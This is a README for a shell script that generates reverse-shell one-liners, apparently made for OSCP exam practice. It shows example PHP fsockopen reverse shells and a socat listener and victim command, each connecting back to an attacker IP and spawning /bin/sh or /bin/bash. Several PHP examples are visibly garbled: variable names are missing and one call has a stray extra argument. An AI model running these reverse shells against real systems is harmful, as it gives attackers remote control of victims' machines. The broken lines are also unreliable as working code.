# Reverse Shell Generator


Command line reverse shell generator. Made to save a bit of time and effort on the OSCP.


Takes the name of a binary, an interface, and a port as input and returns reverse shell one-liners as output.

If no interface or port number is supplied, the defaults are tun0 for interface and port 443.

More binaries to be supported in the future.


## Examples

```
./shellgen.sh -s php -i tun0 -p 4444


Reverse TCP:

                                                                                                                                                                                                                                             
        php -r '=fsockopen(192.168.49.220,4444);exec("/bin/sh -i <&3 >&3 2>&3");'                                                                                 
        php -r '=fsockopen(192.168.49.220,4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'                                                                             
        php -r '=fsockopen(192.168.49.220,4444);`/bin/sh -i <&3 >&3 2>&3`;'                  
        php -r '=fsockopen(192.168.49.220,4444),4242);system("/bin/sh -i <&3 >&3 2>&3");'                                                                           
        php -r '=fsockopen(192.168.49.220,4444);passthru("/bin/sh -i <&3 >&3 2>&3");'                                                                               
        php -r '=fsockopen(192.168.49.220,4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'                                                                             
        php -r '=fsockopen(192.168.49.220,4444);=proc_open("/bin/sh -i", array(0=>, 1=>, 2=>),);'



./shellgen.sh -s socat



Listener:
                                                         
                                                                                                                                                                                                                                             
        socat file:/dev/pts/0,raw,echo=0 tcp-listen:443                                                                                                                     
        
                                                                                                                                                                                                                                             
Victim:                                                                                                                                                                                                                        
                                                                                                                                                                                                                                             
        socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:192.168.49.220:443
        
        
        ```
       
       
